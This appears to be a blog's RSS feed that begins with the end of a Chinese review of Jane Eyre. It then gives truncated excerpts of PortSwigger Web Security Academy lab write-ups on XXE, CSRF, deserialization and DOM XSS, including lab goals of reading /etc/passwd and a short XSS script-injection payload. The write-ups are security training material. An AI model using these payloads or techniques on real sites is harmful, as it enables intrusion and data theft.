&lt;p>這根本是一部披著愛情的推理解謎，至少寫法有點像，總是會先丟一些不知所云的懸念和線索，可能快則下一章，慢則十章後就會解答當初的台詞、情境以及行為&lt;/p>
&lt;/li>
&lt;li>
&lt;p>這一套翻譯讓我看了覺得尷尬，想像的畫面不是超級八點檔就是類似誇張的舞台劇，而且台詞支離破碎&lt;/p>
&lt;/li>
&lt;li>
&lt;p>整篇文章充斥著女主角簡愛對於自由的渴望，用了非常非常多的&amp;quot;我有權決定&amp;hellip;&amp;quot;，並且時常打破傳統的思維，某種層面和我自己蠻像的，簡單講就是反骨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>女主的性格就是一個非常理性的人，別人想用詩意打動人心，他會分析其中不合理的舉止和批判試圖囚禁自由的說詞&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第25章還蠻重要的，又是一大段的鋪陳和懸念
:::&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="總結">
 總結
 &lt;a class="anchor" href="#%e7%b8%bd%e7%b5%90">#&lt;/a>
&lt;/h2>
&lt;p>這部小說探討了自由與階級的交換是否值得，透過簡愛的經歷，展現了她如何從家暴的家庭逃離，進入慈善學校，卻又面臨饑寒交迫的困境（ch20~ch22也提到了如何與有毒家庭和解）。&lt;/p>
&lt;p>書中的海倫(簡愛小時候的同學)則代表了一種極端的忍耐與順從，她遵循聖經的教誨寬恕一切，然而她已無階級可交換，難道真的只能淪為乞丐，來逃避不公的處境？這也延伸出小說的核心主題之一：何時應該忍耐，何時應該反擊，並承擔不同選擇的後果。&lt;/p>
&lt;p>從前面的離家到後面的毅然決然離開羅撤斯特，都在在表示簡愛面對抉擇時，不會猶豫不決並且遵從內心，嚮往毫無瑕疵的靈魂又或者說是不受委屈且自由的未來，縱使劇情放到現在依然瓊瑤感滿滿，也渲染鄉土八點檔特色，但提點女性甚或是任何人必須要遵從內心(在書中可能類似上帝之音等等指引)，選擇不會後悔的未來這件事情還是極具意義，從敘事文筆以及情節編排上，我認為都蠻值得學習，男女主角的相處模式有些像現代的「霸道總裁」情節，而整體寫作風格更接近解謎小說，每閱讀一個章節，就是埋下一些懸念和鋪陳的味道，並且同時回收前面那些一時無法明白的橋段，雖然不難猜，但手法很流暢，在文筆上也不拖泥帶水，非常適合暈船仔看。
從頭到尾，簡愛對自由的渴望貫穿全文，頻繁強調「我有權決定……」，並不斷挑戰傳統思維。某種程度上，她的個性與我的思維方式相似，都帶著一點反骨。她的理性思維使她拒絕詩意的修辭，並冷靜分析那些試圖限制她自由的言論。&lt;/p>
&lt;h2 id="章節編排和重點">
 章節編排和重點
 &lt;a class="anchor" href="#%e7%ab%a0%e7%af%80%e7%b7%a8%e6%8e%92%e5%92%8c%e9%87%8d%e9%bb%9e">#&lt;/a>
&lt;/h2>
&lt;p>小說對當時荒唐的教育體制提出批判，要求學生毫無缺陷、服從如軍營般的紀律。第10章描述了簡愛從家庭到學校的轉變，接著便進入她成為家庭教師的故事。而第14章開始，男主角羅徹斯特登場，他行為古怪，發問方式異常，可能是在傳遞特定觀念，或為後續劇情埋下伏筆。第25章是個關鍵轉折點，又埋下了大量伏筆與懸念，預示著後續劇情的重要發展。第30章就大概是離開桑費德並且和堂兄姐妹團聚的橋段&lt;/p>
&lt;h2 id="缺點">
 缺點
 &lt;a class="anchor" href="#%e7%bc%ba%e9%bb%9e">#&lt;/a>
&lt;/h2>
&lt;p>這本翻譯小說的表達方式讓人感到尷尬，對話時而像八點檔，時而像誇張的舞台劇，台詞也顯得零碎不連貫。簡愛的堂哥聖約翰真的很討厭，完全把自己奉獻給上帝就算了，還要一個工具人老婆，還給我情勒和PUA，這也是這部小說我沒那麼喜歡的地方，凡是牽扯上帝，宗教色彩非常濃厚，在前半端(也就是大約30章以前)還可以說上帝云云放到現在應該隱喻任何困難或是自己的內心等等，但後半段真的就是那個年代會有的思想，包含為了上帝&amp;hellip;或是為他工作&amp;hellip;，總之價值觀在後半段就是不合時宜&lt;/p>
&lt;h2 id="有趣的部分">
 有趣的部分
 &lt;a class="anchor" href="#%e6%9c%89%e8%b6%a3%e7%9a%84%e9%83%a8%e5%88%86">#&lt;/a>
&lt;/h2>
&lt;p>在P.148，阿黛拉「無父無母」的設定耐人尋味，可能暗示簡愛認為：&lt;/p>
&lt;ol>
&lt;li>羅徹斯特不是阿黛拉的生父。&lt;/li>
&lt;li>即使他是生父，也從未給予阿黛拉父愛。&lt;/li>
&lt;/ol></description></item><item><title>Lab: Arbitrary object injection in PHP</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/</guid><description>&lt;h1 id="lab-arbitrary-object-injection-in-php">
 Lab: Arbitrary object injection in PHP
 &lt;a class="anchor" href="#lab-arbitrary-object-injection-in-php">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result.&lt;/li>
&lt;li>Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&amp;rsquo;s home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials: wiener:peter&lt;/li>
&lt;li>Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.&lt;/li>
&lt;/ul>
&lt;h2 id="constructor--deconstructor">
 Constructor &amp;amp; Deconstructor
 &lt;a class="anchor" href="#constructor--deconstructor">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://tw511.com/a/01/26451.html">Python建構函式與解構函式（&lt;strong>init&lt;/strong>()和__del__()）&lt;/a>
其實概念就是Python的&lt;code>__init()__&lt;/code> function，在instanciate一個class的時候扮演初始化的功能而已
而deconstructor就是Python中的&lt;code>__del__()&lt;/code> function用來回收不需要的class，以達到降低記憶體的使用量&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction">
 Lab: Blind XXE with out-of-band interaction
 &lt;a class="anchor" href="#lab-blind-xxe-with-out-of-band-interaction">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input but does not display the result.
You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.&lt;/li>
&lt;li>Goal: To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.&lt;/li>
&lt;li>Hint:&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 &lt;a href="https://portswigger.net/web-security/xxe/blind">Background&lt;/a>
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：&lt;/p></description></item><item><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/</guid><description>&lt;h1 id="lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">
 Lab: Blind XXE with out-of-band interaction via XML parameter entities
 &lt;a class="anchor" href="#lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.&lt;/li>
&lt;li>Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.&lt;/li>
&lt;li>Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator&amp;rsquo;s default public server.&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在&lt;code>DOCTYPE&lt;/code>中直接Reference，也就是利用&lt;code>%&lt;/code>這個字元達到這個效果&lt;/p></description></item><item><title>Lab: CSRF where token is not tied to user session</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/</guid><description>&lt;h1 id="lab-csrf-where-token-is-not-tied-to-user-session">
 Lab: CSRF where token is not tied to user session
 &lt;a class="anchor" href="#lab-csrf-where-token-is-not-tied-to-user-session">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren&amp;rsquo;t integrated into the site&amp;rsquo;s session handling system.&lt;/li>
&lt;li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
&lt;code>wiener:peter&lt;/code>
&lt;code>carlos:montoya&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>CSRF token should tied to user session otherwise, it&amp;rsquo;ll exploited by attacker.&lt;/p></description></item><item><title>Lab: CSRF where token is tied to non-session cookie</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/</guid><description>&lt;h1 id="lab-csrf-where-token-is-tied-to-non-session-cookie">
 Lab: CSRF where token is tied to non-session cookie
 &lt;a class="anchor" href="#lab-csrf-where-token-is-tied-to-non-session-cookie">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>
&lt;p>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren&amp;rsquo;t fully integrated into the site&amp;rsquo;s session handling system.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
&lt;code>wiener:peter&lt;/code>
&lt;code>carlos:montoya&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on request method</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-request-method">
 Lab: CSRF where token validation depends on request method
 &lt;a class="anchor" href="#lab-csrf-where-token-validation-depends-on-request-method">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.&lt;/li>
&lt;li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
You can log in to your own account using the following credentials: &lt;code>wiener:peter&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Login and update email to trace the package
Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below:
&lt;img src="https://i.imgur.com/ju0fDUQ.png" alt="" />
We can notice that the carried data including &lt;code>csrf_token&lt;/code>&lt;/p></description></item><item><title>Lab: CSRF where token validation depends on token being present</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/</guid><description>&lt;h1 id="lab-csrf-where-token-validation-depends-on-token-being-present">
 Lab: CSRF where token validation depends on token being present
 &lt;a class="anchor" href="#lab-csrf-where-token-validation-depends-on-token-being-present">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab&amp;rsquo;s email change functionality is vulnerable to CSRF.&lt;/li>
&lt;li>Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer&amp;rsquo;s email address.
You can log in to your own account using the following credentials: &lt;code>wiener:peter&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Login and update email to trace the package
It&amp;rsquo;s very similar with previous lab $\to$ it contained &lt;code>CSRF_token&lt;/code> as its carried data:
&lt;img src="https://i.imgur.com/69FaW1R.png" alt="" />&lt;/p></description></item><item><title>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/</guid><description>&lt;h1 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">
 Lab: DOM XSS in &lt;code>document.write&lt;/code> sink using source &lt;code>location.search&lt;/code> inside a select element
 &lt;a class="anchor" href="#lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript &lt;code>document.write&lt;/code> function, which writes data out to the page. The &lt;code>document.write&lt;/code> function is called with data from &lt;code>location.search&lt;/code> which you can control using the website URL. The data is enclosed within a select element.&lt;/li>
&lt;li>Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the &lt;code>alert&lt;/code> function.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Find the injection place
I used string search to find &lt;code>location.search&lt;/code> in each sub-page source.
Here is the interesting code:
:::spoiler Source Code
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 var stores = [&amp;#34;London&amp;#34;,&amp;#34;Paris&amp;#34;,&amp;#34;Milan&amp;#34;];
 var store = (new URLSearchParams(window.location.search)).get(&amp;#39;storeId&amp;#39;);
 document.write(&amp;#39;&amp;lt;select name=&amp;#34;storeId&amp;#34;&amp;gt;&amp;#39;);
 if(store) {
 document.write(&amp;#39;&amp;lt;option selected&amp;gt;&amp;#39;+store+&amp;#39;&amp;lt;/option&amp;gt;&amp;#39;);
 }
 for(var i=0;i&amp;lt;stores.length;i++) {
 if(stores[i] === store) {
 continue;
 }
 document.write(&amp;#39;&amp;lt;option&amp;gt;&amp;#39;+stores[i]+&amp;#39;&amp;lt;/option&amp;gt;&amp;#39;);
 }
 document.write(&amp;#39;&amp;lt;/select&amp;gt;&amp;#39;);
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>Try type something about &lt;code>storeID&lt;/code> as URL GET parameter
Payload: &lt;code>/product?productId=1&amp;amp;storeId=abc&lt;/code>
&lt;img src="https://i.imgur.com/KKbTF8f.png" alt="" />
You can see that this is a perfect injection place&lt;/li>
&lt;/ol>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>/product?productId=1&amp;amp;storeId=&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/bjEoUzh.png" alt="" />
:::&lt;/p></description></item><item><title>Lab: Exploiting `XInclude` to retrieve files</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/</guid><description>&lt;h1 id="lab-exploiting-xinclude-to-retrieve-files">
 Lab: Exploiting &lt;code>XInclude&lt;/code> to retrieve files
 &lt;a class="anchor" href="#lab-exploiting-xinclude-to-retrieve-files">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that embeds the user input inside a server-side XML document that is subsequently parsed.
Because you don&amp;rsquo;t control the entire XML document you can&amp;rsquo;t define a DTD to launch a classic XXE attack.&lt;/li>
&lt;li>Goal: To solve the lab, inject an &lt;code>XInclude&lt;/code> statement to retrieve the contents of the /etc/passwd file.&lt;/li>
&lt;li>Hint: By default, &lt;code>XInclude&lt;/code> will try to parse the included document as XML. Since /etc/passwd isn&amp;rsquo;t valid XML, you will need to add an extra attribute to the &lt;code>XInclude&lt;/code> directive to change this behavior.&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">
 Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
 &lt;a class="anchor" href="#lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input but does not display the result.&lt;/li>
&lt;li>Goal: To solve the lab, exfiltrate the contents of the /etc/hostname file.&lt;/li>
&lt;li>Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator&amp;rsquo;s default public server.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use the previous method
:::spoiler Payload&lt;/p></description></item><item><title>Lab: Exploiting blind XXE to retrieve data via error messages</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/</guid><description>&lt;h1 id="lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">
 Lab: Exploiting blind XXE to retrieve data via error messages
 &lt;a class="anchor" href="#lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab has a &amp;ldquo;Check stock&amp;rdquo; feature that parses XML input but does not display the result.&lt;/li>
&lt;li>Goal: To solve the lab, use an external DTD to trigger an error message that displays the contents of the &lt;code>/etc/passwd&lt;/code> file.
The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>This is very similar to the previous lab(Exploiting blind XXE to exfiltrate data using a malicious external DTD)&lt;/p></description></item><item><title>Lab: Exploiting Java deserialization with Apache Commons</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/</guid><description>&lt;h1 id="lab-exploiting-java-deserialization-with-apache-commons">
 Lab: Exploiting Java deserialization with Apache Commons
 &lt;a class="anchor" href="#lab-exploiting-java-deserialization-with-apache-commons">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don&amp;rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.&lt;/li>
&lt;li>Goal: To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&amp;rsquo;s home directory.
You can log in to your own account using the following credentials: wiener:peter&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ccship.cn/2021/10/21/ysoserial%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">ysoserial使用方法&lt;/a>&lt;/p></description></item><item><title>Lab: Exploiting XXE via image file upload</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/</guid><description>&lt;h1 id="lab-exploiting-xxe-via-image-file-upload">
 Lab: Exploiting XXE via image file upload
 &lt;a class="anchor" href="#lab-exploiting-xxe-via-image-file-upload">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.&lt;/li>
&lt;li>Goal: To solve the lab, upload an image that displays the contents of the &lt;code>/etc/hostname&lt;/code> file after processing. Then use the &amp;ldquo;Submit solution&amp;rdquo; button to submit the value of the server hostname.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>In this lab, we can upload an exploited file which contained malicious xml data. Then we can fetch some sensitive information.&lt;/p></description></item><item><title>Lab: Modifying serialized data types</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/</guid><description>&lt;h1 id="lab-modifying-serialized-data-types">
 Lab: Modifying serialized data types
 &lt;a class="anchor" href="#lab-modifying-serialized-data-types">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result&lt;/li>
&lt;li>Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
You can log in to your own account using the following credentials: wiener:peter&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
